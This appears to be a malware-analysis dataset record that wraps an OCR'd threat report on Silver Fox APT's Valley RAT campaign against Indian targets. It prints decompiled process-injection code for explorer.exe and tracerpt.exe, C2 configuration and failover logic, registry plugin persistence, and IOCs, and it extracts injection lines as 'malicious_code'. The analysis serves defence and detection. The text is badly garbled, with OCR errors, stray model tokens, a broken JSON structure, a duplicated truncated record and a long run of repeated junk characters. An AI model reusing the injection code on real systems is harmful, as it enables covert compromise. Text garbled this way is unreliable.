\n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "lpBaseAddress=VirtualAllocEx(lpProcessInformation->hProcess,0,dwSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0)", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/